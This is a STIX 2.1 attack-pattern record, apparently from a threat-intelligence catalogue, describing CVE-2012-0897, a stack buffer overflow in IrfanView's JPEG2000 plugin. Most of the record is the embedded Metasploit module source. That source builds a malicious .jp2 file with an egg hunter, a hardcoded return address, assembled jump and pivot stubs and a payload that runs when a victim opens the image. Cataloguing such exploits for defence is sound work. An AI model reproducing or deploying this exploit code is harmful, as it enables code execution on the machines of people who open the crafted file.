{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8feaa529-2c82-460d-9add-03c5547d877f",
    "created": "2024-08-14T16:36:35.262946Z",
    "modified": "2024-08-14T16:36:35.26295Z",
    "name": "Irfanview JPEG2000 jp2 Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in version <= 4.3.2.0 of Irfanview's JPEG2000.dll plugin. This exploit has been tested on a specific version of irfanview (v4.3.2), although other versions may work also. The vulnerability is triggered via parsing an invalid qcd chunk structure and specifying a malformed qcd size and data.  Payload delivery and vulnerability trigger can be executed in multiple ways. The user can double click the file, use the file dialog, open via the icon and drag/drop the file into Irfanview's window. An egg hunter is used for stability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/irfanview_jpeg2000_bof.rb",
            "external_id": "irfanview_jpeg2000_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0897"
        },
        {
            "source_name": "reference",
            "url": "http://www.greyhathacker.net/?p=525"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Irfanview JPEG2000 jp2 Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow vulnerability in\n        version <= 4.3.2.0 of Irfanview's JPEG2000.dll plugin. This exploit has\n        been tested on a specific version of irfanview (v4.3.2), although other\n        versions may work also. The vulnerability is triggered via parsing an\n        invalid qcd chunk structure and specifying a malformed qcd size and\n        data.\n\n        Payload delivery and vulnerability trigger can be executed in multiple\n        ways. The user can double click the file, use the file dialog, open via\n        the icon and drag/drop the file into Irfanview's window. An egg hunter\n        is used for stability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Parvez Anwar <parvez[at]greyhathacker.net>', # vulnerability discovery\n          'mr_me <steventhomasseeley[at]gmail.com>',    # msf-fu\n          'juan vazquez'                                # more improvements\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0897' ],\n          [ 'OSVDB', '78333'],\n          [ 'BID', '51426' ],\n          [ 'URL', 'http://www.greyhathacker.net/?p=525' ],\n        ],\n      'Platform'          => [ 'win' ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'           =>\n        {\n          'Space'    => 4000,\n          'DisableNops' => true,\n        },\n      'Targets'        =>\n        [\n          # push esp; retn [i_view32.exe]\n          # http://www.oldapps.com/irfanview.php?old_irfanview=7097\n          # http://irfanview.tuwien.ac.at/plugins/irfanview_plugins_432_setup.exe\n          [ 'Irfanview 4.32 / Plugins 4.32 / Windows Universal', { 'Ret' => 0x004819d8 } ]\n        ],\n      'DisclosureDate' => '2012-01-16',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The output file name.', 'msf.jp2']),\n        ])\n  end\n\n  # encode our string like unicode except we are not using nulls\n  def encode_bytes(raw_bytes)\n    encoded_bytes = \"\"\n    0.step(raw_bytes.length-1, 2) { |i|\n      encoded_bytes << raw_bytes[i+1]\n      encoded_bytes << raw_bytes[i]\n    }\n    return encoded_bytes\n  end\n\n  def exploit\n    jp2  = \"\"\n    jp2 << \"\\x00\\x00\\x00\\x0c\"         #\n    jp2 << \"\\x6a\\x50\\x20\\x20\"         # [jP  ] <0x6a502020> magic 0xd0a870a,len 12\n    jp2 << \"\\x0d\\x0a\\x87\\x0a\"         #\n    jp2 << \"\\x00\\x00\\x00\\x14\"         #\n    jp2 << \"\\x66\\x74\\x79\\x70\"         #\n    jp2 << \"\\x6a\\x70\\x32\\x20\"         #\n    jp2 << \"\\x00\\x00\\x00\\x00\"         #         MinorVersion = 0      = [\\0\\0\\0\\0]\n    jp2 << \"\\x6a\\x70\\x32\\x20\"         #         Compat = 0x6a703220 = [jp2 ]\n    jp2 << \"\\x00\\x00\\x00\\x38\"         #\n    jp2 << \"\\x75\\x75\\x69\\x64\"         # [uuid] <0x75756964> len 56 data offset 8\n    jp2 << \"\\x61\\x70\\x00\\xde\\xec\\x87\" # 56 bytes with start and end tags\n    jp2 << \"\\xd5\\x11\\xb2\\xed\\x00\\x50\" #\n    jp2 << \"\\x04\\x71\\xfd\\xdc\\xd2\\x00\" #\n    jp2 << \"\\x00\\x00\\x40\\x01\\x00\\x00\" #\n    jp2 << \"\\x00\\x00\\x00\\x00\\x60\\x09\" #\n    jp2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\" #\n    jp2 << \"\\x00\\x00\\x00\\x00\\x00\\x00\" #\n    jp2 << \"\\x00\\x00\\x30\\x00\\x00\\x00\" #\n    jp2 << \"\\x00\\x00\\x00\\x2d\"         #\n    jp2 << \"\\x6a\\x70\\x32\\x68\"         # [jp2h] <0x6a703268> len 45 data offset 8\n    jp2 << \"\\x00\\x00\\x00\\x16\"         #\n    jp2 << \"\\x69\\x68\\x64\\x72\"         # [ihdr] <0x69686472> len 22 data offset 8\n    jp2 << \"\\x00\\x00\\x00\\x0a\"         #         ImageHeight = 10\n    jp2 << \"\\x00\\x00\\x00\\x0a\"         #         ImageWidth = 10\n    jp2 << \"\\x00\\x03\"                 #         NumberOfComponents = 3\n    jp2 << \"\\x07\"                     #         BitsPerComponent = 7\n    jp2 << \"\\x07\"                     #         Compression = 7\n    jp2 << \"\\x01\"                     #         Colorspace = 0x1 = unknown\n    jp2 << \"\\x00\\x00\\x00\\x00\\x0f\"     #\n    jp2 << \"\\x63\\x6f\\x6c\\x72\"         # [colr] <0x636f6c72> len 15 data offset 8\n    jp2 << \"\\x01\"                     #         Method = 1\n    jp2 << \"\\x00\"                     #         Precedence = 0\n    jp2 << \"\\x00\"                     #         ColorSpaceAproximation = 0\n    jp2 << \"\\x00\\x00\\x00\"             #         EnumeratedColorSpace = 16 = sRGB\n    jp2 << \"\\x10\\x00\\x00\\x00\\x00\"     #\n    jp2 << \"\\x6a\\x70\\x32\\x63\"         # [jp2c] <0x6a703263> length 0 data offset 8\n    jp2 << \"\\xff\\x4f\"                 # <0xff4f=JP2C_SOC> Start of codestream\n    jp2 << \"\\xff\\x51\"                 # <0xff51=JP2C_SIZ> length 47\n    jp2 << \"\\x00\\x2f\"                 #         47 bytes\n    jp2 << \"\\x00\\x00\"                 #         Capabilities = 0\n    jp2 << \"\\x00\\x00\\x00\\x0a\"         #         GridWidth = 10\n    jp2 << \"\\x00\\x00\\x00\\x0a\"         #         GridHeight = 10\n    jp2 << \"\\x00\\x00\\x00\\x00\"         #         XImageOffset = 0\n    jp2 << \"\\x00\\x00\\x00\\x00\"         #         YImageOffset = 0\n    jp2 << \"\\x00\\x00\\x00\\x0a\"         #         TileWidth = 10\n    jp2 << \"\\x00\\x00\\x00\\x0a\"         #         TileHeight = 10\n    jp2 << \"\\x00\\x00\\x00\\x00\"         #         Xtileoffset = 0\n    jp2 << \"\\x00\\x00\\x00\\x00\"         #         Ytileoffset = 0\n    jp2 << \"\\x00\\x03\"                 #         NumberOfComponents = 3\n    jp2 << \"\\x07\\x01\\x01\"             #   Component0Pr=0x7=8 bits un,hsep=1,vsep=1\n    jp2 << \"\\x07\\x01\\x01\"             #   Component0Pr=0x7=8 bits un,hsep=1,vsep=1\n    jp2 << \"\\x07\\x01\\x01\"             #   Component0Pr=0x7=8 bits un,hsep=1,vsep=1\n    jp2 << \"\\xff\\x52\"                 # <0xff52=JP2C_COD> length 12\n    jp2 << \"\\x00\\x0c\"                 #   12 bytes\n    jp2 << \"\\x00\"                     #   codingStyle=0=entropy coder w/o partition\n    jp2 << \"\\x00\"                     #   ProgressionOrder = 0\n    jp2 << \"\\x00\\x05\"                 #   NumberOfLayers = 0x5\n    jp2 << \"\\x01\"                     #   MultiComponentTransform=0x1=5/3 reversible\n    jp2 << \"\\x05\"                     #   DecompLevels = 5\n    jp2 << \"\\x04\"                     #   CodeBlockWidthExponent=0x4+2 # cbw ->64\n    jp2 << \"\\x04\"                     #   CodeBlockHeightExponent=0x4+2 # cbh ->64\n    jp2 << \"\\x00\"                     #   CodeBLockStyle = 0\n    jp2 << \"\\x00\"                     #   QMIFBankId = 0\n\n    eggoptions =\n    {\n      :checksum => false,\n      :eggtag => 'pwnd'\n    }\n\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n    qcd_data  = \"\"\n    qcd_data << make_nops(10)\n    qcd_data << encode_bytes(hunter)\n    qcd_data << rand_text_alpha(146)\n\n    jmp_hunter = %q{\n      jmp $-0xad\n      inc ecx\n    }\n\n    # jump to our egghunter\n    jmp_hunter = Metasm::Shellcode.assemble(Metasm::Ia32.new, jmp_hunter).encode_string\n\n    qcd_data << encode_bytes(jmp_hunter)\n    qcd_data << rand_text_alpha(196-qcd_data.length)\n    qcd_data << encode_bytes([target.ret].pack(\"V\"))\n\n    # align ecx and jmp\n    pivot = %q{\n      inc ch\n      jmp ecx\n    }\n\n    pivot  = Metasm::Shellcode.assemble(Metasm::Ia32.new, pivot).encode_string\n\n    qcd_data << encode_bytes(pivot)\n    qcd_data << egg\n\n    jp2 << \"\\xff\\x5c\"                         # start\n    jp2 << \"\\x00\\xf5\"                         # arbitrary size to trigger overflow\n    jp2 << \"\\x22\"                             # guard\n    jp2 << qcd_data                           # malicious code\n    jp2 << \"\\xff\\x90\"                         # <0xff90=JP2C_SOT>len 10\n    jp2 << \"\\x00\\x0a\"                         # 10 bytes\n    jp2 << \"\\x00\\x00\\x00\\x00\\x00\\x68\\x00\\x01\"\n    jp2 << \"\\xff\\x93\"                         # <0xff93=JP2C_SOD> Start of data\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x80\"\n    jp2 << \"\\x80\\x80\"\n    jp2 << \"\\xff\\xd9\"\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(jp2)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-16",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}